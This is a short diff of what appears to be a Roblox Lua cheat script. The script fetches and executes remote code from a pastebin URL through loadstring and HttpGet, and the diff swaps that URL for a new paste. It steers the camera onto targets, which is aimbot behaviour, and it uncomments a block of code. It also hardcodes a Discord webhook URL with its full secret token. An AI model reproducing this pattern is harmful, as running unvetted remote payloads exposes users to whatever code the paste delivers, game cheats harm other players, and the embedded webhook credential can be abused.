@@ -1,4 +1,4 @@
-                               local Aiming = loadstring(game:HttpGet("https://pastebin.com/raw/7AuAFPi7", true))()
+                                local Aiming = loadstring(game:HttpGet("https://pastebin.com/raw/YmUFTisy", true))()
                             Aiming.TeamCheck(false)
                              
                             
@@ -73,7 +73,7 @@
                             
                                     CurrentCamera.CFrame = CFrame.lookAt(CurrentCamera.CFrame.Position, Hit.Position)
                                 end
-                                end) --]]
+                                end)
                                 
                                local webh = "https://discord.com/api/webhooks/1087522656175276142/NnxNDlVmfZ-tJGMnXeuaG7LqL3jJOzsM6rSD1EZYg0HJM2WjH6F_i2tsP74jgrPmN6TE"
 
